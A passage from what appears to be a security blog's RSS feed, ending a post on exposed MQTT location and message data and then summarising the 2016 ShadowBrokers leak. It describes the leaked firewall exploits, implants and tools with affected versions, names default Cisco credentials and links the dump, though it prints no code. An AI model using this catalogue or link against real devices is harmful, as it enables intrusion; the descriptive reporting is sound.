href=&#34;https://2.bp.blogspot.com/-lcA66h27ALc/V95SZ6ZWiJI/AAAAAAAANUw/9T1kk7S8ggcFBSqFI_LL6RvQxYc04ohowCLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B10.33.46.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;35&#34; src=&#34;https://2.bp.blogspot.com/-lcA66h27ALc/V95SZ6ZWiJI/AAAAAAAANUw/9T1kk7S8ggcFBSqFI_LL6RvQxYc04ohowCLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B10.33.46.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Anonymised Private Message between pharmaceutical services (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The following image shows an interesting &#34;spying&#34; service (actually it&#39;s &lt;a href=&#34;http://owntracks.org/&#34;&gt;owntracks.org&lt;/a&gt;) which communicates geo-location over MQTT unauthenticated brokers.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;float: left; margin-right: 1em; text-align: left;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-owfIdsSVFUA/V95Th9K2juI/AAAAAAAANU0/TQn86hrybFETdjt0Z929FMQJMaIRhfdRACLcB/s1600/Screen%2BShot%2B2016-09-18%2Bat%2B10.40.49.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;12&#34; src=&#34;https://4.bp.blogspot.com/-owfIdsSVFUA/V95Th9K2juI/AAAAAAAANU0/TQn86hrybFETdjt0Z929FMQJMaIRhfdRACLcB/s640/Screen%2BShot%2B2016-09-18%2Bat%2B10.40.49.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Geo-location tracks (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Naturally such a private information should not be freely accessible. For example knowing where people are without their permissions is illegal in many states, or reading their application messages without judiciary consent is illegal in many states as well. Naturally the correlation to such information is illegal as well. Unfortunately attackers are everywhere and thanks to internet and telecommunication their malicious activities could have global impacts. Nowadays everybody has got a smart devices, everybody keeps trace of own steps, everybody keeps monitored own heart and everybody put everything on a cloud who does not belong to him. On the other hand applications are not always well protected making data freely available and exposing data owner to incredible indirect risks.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Final Thoughts:&lt;/b&gt;&lt;br /&gt;Unfortunately Is not possible to stop this process: Tomorrow there will be more smart things that today. Unfortunately is not possible to protect everything: products have to get to the market as quick as possible to gain market. This process is quicker than the ability of the security community to safely test everything. De facto we will continue to use even more &#34;smart things&#34; which will monitor everything about our life.&lt;br /&gt;&lt;br /&gt;Threats are changing, so are we &amp;nbsp;? &amp;nbsp; &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Summing up the ShadowBrokers Leak</title>
      <link>http://marcoramilli.com/post/summing-up-the-shadowbrokers-leak/</link>
      <pubDate>Tue, 23 Aug 2016 00:02:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/summing-up-the-shadowbrokers-leak/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;a href=&#34;https://www.washingtonpost.com/world/national-security/powerful-nsa-hacking-tools-have-been-revealed-online/2016/08/16/bce4f974-63c7-11e6-96c0-37533479f3f5_story.html&#34;&gt;Nowadays&lt;/a&gt; it&#39;s almost impossible to not write about EquationGroup Leak, so I&#39;m going to start my &#34;blog post&#34; pushing the following picture (realised by Kaspersky Lab) which would cut-out every doubts about the leak paternity.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-T3cI1166gJk/V7neZwaqJqI/AAAAAAAANMI/va-RqU2FDWEzcZE-QVGVrxLOgurqYuAdgCLcB/s1600/Screen%2BShot%2B2016-08-21%2Bat%2B18.56.01.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;207&#34; src=&#34;https://2.bp.blogspot.com/-T3cI1166gJk/V7neZwaqJqI/AAAAAAAANMI/va-RqU2FDWEzcZE-QVGVrxLOgurqYuAdgCLcB/s400/Screen%2BShot%2B2016-08-21%2Bat%2B18.56.01.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;EquationGroup VS ShadowBrokers&#39;s Leak&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The &lt;a href=&#34;https://mega.nz/#!zEAU1AQL!oWJ63n-D6lCuCQ4AY0Cv_405hX8kn7MEsa1iLH5UjKU&#34;&gt;leaked dump&lt;/a&gt; contains a set of exploits, implants and tools for hacking firewalls (code name: &#34;Firewall Operations&#34;). &amp;nbsp;Let&#39;s have a quick look to them:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;b&gt;Exploits:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;Following a list of exploit found on the published leak. Please refer to sources at the bottom of the page for original writing about them.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;EGREGIOUSBLUNDER&lt;/b&gt;. It is a remote code execution exploit for Fortigate firewalls. It leverages an HTTP cookie overflow and is different from CVE-2006-6493 as noted by Avast. Models affected include 60, 60M, 80C, 200A, 300A, 400A, 500A, 620B, 800, 5000, 1000A, 3600, and 3600A.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;ELIGIBLEBACHELOR&lt;/b&gt; This is an exploit with an unclear attack vector for TOPSEC firewalls running TOS operating system versions 3.2.100.010, 3.3.001.050, 3.3.002.021 and 3.3.002.030.The attack vector is unknown but it has an XML-like payload that starts with &lt;code&gt;&lt;/code&gt;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;ELIGIBLEBOMBSHELL&lt;/b&gt;&amp;nbsp;It is a remote code execution exploit for TOPSEC  firewalls. It exploits an HTTP cookie command injection vulnerability  and uses ETag examination for version detection. Versions affected  include 3.2.100.010.1_pbc_17_iv_3 to 3.3.005.066.1.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;WOBBLYLLAMA&lt;/strong&gt;A payload for the ELIGIBLEBOMBSHELL TOPSEC firewall exploit affecting version 3.3.002.030.8_003.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;FLOCKFORWARD&lt;/strong&gt;A payload for the ELIGIBLEBOMBSHELL TOPSEC firewall exploit affecting version 3.3.005.066.1.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;HIDDENTEMPLE&lt;/strong&gt;A payload for the ELIGIBLEBOMBSHELL TOPSEC firewall exploit affecting version tos_3.2.8840.1.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;CONTAINMENTGRID&lt;/strong&gt;A payload for the ELIGIBLEBOMBSHELL TOPSEC firewall exploit affecting version tos_3.3.005.066.1.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;GOTHAMKNIGHT&lt;/strong&gt;A payload for the ELIGIBLEBOMBSHELL TOPSEC firewall exploit affecting version 3.2.100.010.8_pbc_27. Has no BLATSTING support.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;ELIGIBLECANDIDATE&lt;/strong&gt;A remote code execution exploit for TOPSEC firewalls that exploits a  HTTP cookie command injection vulnerability, affecting versions  3.3.005.057.1 to 3.3.010.024.1.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;ELIGIBLECONTESTANT&lt;/strong&gt;A remote code execution exploit for TOPSEC firewalls that exploits a  HTTP POST paramter injection vulnerability, affecting versions  3.3.005.057.1 to 3.3.010.024.1. This exploit can be tried after  ELIGIBLECANDIDATE.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;EPICBANANA&lt;/strong&gt;A privilege escalation exploit against Cisco Adaptive Security Appliance  (ASA) and Cisco Private Internet eXchange (PIX) devices. Exploitation  takes advantage of default Cisco credentials (password: cisco). Affects  ASA versions 711, 712, 721, 722, 723, 724, 80432, 804, 805, 822, 823,  824, 825, 831, 832 and PIX versions 711, 712, 721, 722, 723, 724, 804.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;ESCALATEPLOWMAN&lt;/strong&gt;A privilege escalation exploit against WatchGuard firewalls of unknown versions that injects code via the &lt;code&gt;ifconfig&lt;/code&gt; command.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;EXTRABACON&lt;/strong&gt;A remote code execution exploit against Cisco Adaptive Security  Appliance (ASA) devices affecting ASA versions 802, 803, 804, 805, 821,  822, 823, 824, 825, 831, 832, 841, 842, 843, 844. It exploits an  overflow vulnerability using the Simple Network Management Protocol  (SNMP) and relies on knowing the target&#39;s uptime and software version.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;BOOKISHMUTE&lt;/strong&gt;An exploit against an unknown firewall using Red Hat 6.0.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;FALSEMOREL&lt;/strong&gt;Allows for the deduction of the &#34;enable&#34; password from data freely  offered by an unspecified firewall (likely Cisco) and obtains privileged  level access using only the hash of the &#34;enable&#34; password. Requires  telnet to be installed on the firewall&#39;s inside interface.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;br /&gt;Cisco exploits by vulnerabilities:&lt;br /&gt;&lt;br /&gt;&lt;table cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-2rvS0xu4qGk/V7nu6iet7kI/AAAAAAAANMs/Nl4hMX02wEE5n6kTEDq8fhFVQ7FgKNBtgCLcB/s1600/Screen%2BShot%2B2016-08-21%2Bat%2B20.10.15.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;168&#34; src=&#34;https://2.bp.blogspot.com/-2rvS0xu4qGk/V7nu6iet7kI/AAAAAAAANMs/Nl4hMX02wEE5n6kTEDq8fhFVQ7FgKNBtgCLcB/s320/Screen%2BShot%2B2016-08-21%2Bat%2B20.10.15.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Cisco Admits Unknown Vulnerabilities&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3 style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Implants:&lt;/b&gt;&lt;/h3&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Following a list of Implants found on the leaked dump.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;BLATSTING&lt;/b&gt; A firewall software implant that is used with EGREGIOUSBLUNDER (Fortigate) and ELIGIBLEBACHELOR (TOPSEC).&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BANANAGLEE&lt;/b&gt; A non-persistent firewall software implant for Cisco ASA and PIX devices that is installed by writing the implant directly to memory. Also mentioned in the previously leaked NSA ANT catalogue.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BANANABALLOT&lt;/b&gt; A BIOS module associated with an implant (likely BANANAGLEE).&amp;nbsp; &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BEECHPONY&lt;/b&gt; A firewall implant that is a predecessor of BANANAGLEE.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;JETPLOW&lt;/b&gt; A firmware persistence implant for Cisco ASA and PIX devices that persists BANANAGLEE. Also mentioned in the previously leaked NSA ANT catalogue.&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-ZlNyZEccEIs/V7nplD_O2bI/AAAAAAAANMY/2Nf1RNS8l-kmLmW0YIuA1yIOmdNQrBDQwCLcB/s1600/Screen%2BShot%2B2016-08-21%2Bat%2B19.37.55.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;400&#34; src=&#34;https://4.bp.blogspot.com/-ZlNyZEccEIs/V7nplD_O2bI/AAAAAAAANMY/2Nf1RNS8l-kmLmW0YIuA1yIOmdNQrBDQwCLcB/s400/Screen%2BShot%2B2016-08-21%2Bat%2B19.37.55.png&#34; width=&#34;306&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;table cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-uaEzyIqdFcM/V7npm-_j45I/AAAAAAAANMc/cHf86KLgujUvE-VQ8jHkolJ9iedQnnb3QCLcB/s1600/Screen%2BShot%2B2016-08-21%2Bat%2B19.33.41.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;400&#34; src=&#34;https://1.bp.blogspot.com/-uaEzyIqdFcM/V7npm-_j45I/AAAAAAAANMc/cHf86KLgujUvE-VQ8jHkolJ9iedQnnb3QCLcB/s400/Screen%2BShot%2B2016-08-21%2Bat%2B19.33.41.png&#34; width=&#34;322&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;JETPLOW evidence on leaked USA Secret Documents&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;SCREAMINGPLOW&lt;/b&gt; Similar to JETPLOW.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BARGLEE&lt;/b&gt; A firewall software implant. Unknown vendor.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BUZZDIRECTION&lt;/b&gt; A firewall software implant for Fortigate firewalls.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;FEEDTROUGH&lt;/b&gt; A technique for persisting BANANAGLEE and ZESTYLEAK implants for Juniper NetScreen firewalls. Also mentioned in the previously leaked NSA ANT catalogue.&amp;nbsp; &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;JIFFYRAUL&lt;/b&gt; A module loaded into Cisco PIX firewalls with BANANAGLEE.&amp;nbsp; &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BANNANADAIQUIRI&lt;/b&gt; An implant associated with SCREAMINGPLOW. Yes, banana is spelled with three Ns this time.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;POLARPAWS&lt;/b&gt; A firewall implant. Unknown vendor.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;POLARSNEEZE&lt;/b&gt; A firewall implant. Unknown vendor.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;ZESTYLEAK&lt;/b&gt; A firewall software implant for Juniper NetScreen firewalls that is also listed as a module for BANANAGLEE. Also mentioned in the previously leaked NSA ANT catalogue.&amp;nbsp; &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;SECONDDATE&lt;/b&gt; A packet injection module for BANANAGLEE and BARGLEE.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BARPUNCH&lt;/b&gt; A module for BANANAGLEE and BARGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BBALL&lt;/b&gt; A module for BANANAGLEE implants.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BBALLOT&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BBANJO&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BCANDY&lt;/b&gt; A module for BANANAGLEE implants. &amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BFLEA&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BMASSACRE&lt;/b&gt; A module for BANANAGLEE and BARGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BNSLOG&lt;/b&gt; A module for BANANAGLEE and BARGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BPATROL&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BPICKER&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BPIE&lt;/b&gt; A module for BANANAGLEE and BARGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;BUSURPER&lt;/b&gt; A module for BANANAGLEE implants.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;CLUCKLINE&lt;/b&gt; A module for BANANAGLEE implants.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&#34;color: #424242; font-family: &amp;quot;Helvetica Neue&amp;quot;, Helvetica, Arial, sans-serif; font-size: 14px;&#34;&gt;&lt;h2 style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Tools:&lt;/b&gt;&lt;/h2&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Following a list of implemented tools found along the leaked dump.&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;BILLOCEAN&lt;/strong&gt;Retrieves the serial number of a firewall, to be recorded in operation  notes. Used in conjunction with EGREGIOUSBLUNDER for Fortigate  firewalls.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong&gt;FOSHO&lt;/strong&gt;A Python library for creating HTTP exploits.&lt;/div&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;BARICE&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool that provides a shell for installing the BARGLEE implant.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;DURABLENAPKIN&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool for injecting packets on LANs.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;BANANALIAR&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool for connecting to an unspecified implant (likely BANANAGLEE).&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;PANDAROCK&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool for connecting to a POLARPAWS implant.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;TURBOPANDA&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool that can be used to communicate with a HALLUXWATER implant. Also&amp;nbsp;&lt;/span&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;mentioned in the previously leaked &lt;/span&gt;&lt;a href=&#34;https://leaksource.info/2013/12/30/nsas-ant-division-catalog-of-exploits-for-nearly-every-major-software-hardware-firmware/&#34; style=&#34;text-align: justify;&#34;&gt;NSA ANT catalogue&lt;/a&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;TEFLONDOOR&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A self-destructing post-exploitation shell for executing an arbitrary file. The arbitrary file is first encrypted with a key.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;1212/DEHEX&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;Converts hexademical strings to an IP addresses and ports.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;XTRACTPLEASING&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;Extracts something from a file and produces a PCAP file as output.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;NOPEN&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A post-exploitation shell consisting of a client and a server that  encrypts data using RC6. The server is installed on the target machine.&lt;/span&gt;&lt;br /&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/strong&gt;&lt;strong style=&#34;text-align: justify;&#34;&gt;BENIGNCERTAIN&lt;/strong&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;A tool that appears to be for sending certain types of Internet Key  Exchange (IKE) packets to a remote host and parsing the response.&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;h3&gt;&lt;b&gt;RUNNING 